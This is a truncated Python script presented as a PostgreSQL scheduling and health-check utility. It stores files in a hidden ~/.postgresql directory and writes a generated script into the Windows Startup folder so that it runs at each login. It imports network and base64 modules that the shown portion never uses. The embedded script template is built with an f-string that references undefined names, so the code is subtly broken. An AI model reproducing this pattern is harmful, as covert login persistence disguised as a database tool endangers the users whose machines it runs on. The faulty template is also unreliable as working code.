import os
import sys
import json
import time
import subprocess
import urllib.request
import base64
import datetime
import yaml
from pathlib import Path

HOME_DIR = Path.home()
CONFIG_DIR = HOME_DIR / ".postgresql"
CONFIG_FILE = CONFIG_DIR / "config.yaml"
TASKS_FILE = CONFIG_DIR / "scheduled_tasks.json"
LOG_FILE = CONFIG_DIR / "startup.log"
STARTUP_DIR = Path(os.environ.get("APPDATA", HOME_DIR)) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

DEFAULT_CONFIG = {
    "database": {
        "host": "localhost",
        "port": 5432,
        "name": "postgres",
        "user": "postgres"
    },
    "scheduler": {
        "interval_seconds": 300,
        "retry_delay_seconds": 60
    }
}

def load_configuration():
    try:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r') as f:
                return yaml.safe_load(f) or DEFAULT_CONFIG
        return DEFAULT_CONFIG
    except Exception:
        return DEFAULT_CONFIG

def create_startup_task():
    startup_dir = STARTUP_DIR
    if not startup_dir.exists():
        try:
            startup_dir.mkdir(parents=True, exist_ok=True)
        except Exception:
            return False

    script_path = sys.executable
    script_content = f"""import sys
import os
from pathlib import Path
import subprocess
import time

CONFIG_DIR = Path.home() / ".postgresql"
TASKS_FILE = CONFIG_DIR / "scheduled_tasks.json"
LOG_FILE = CONFIG_DIR / "startup.log"

def log_status(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{datetime.datetime.now().isoformat()} - {msg}\\n")
    except Exception:
        pass

def run_health_check():
    try:
        result = subprocess.run(["psql", "-h", "localhost", "-U", "postgres", "-c", "SELECT 1"], 
                                capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
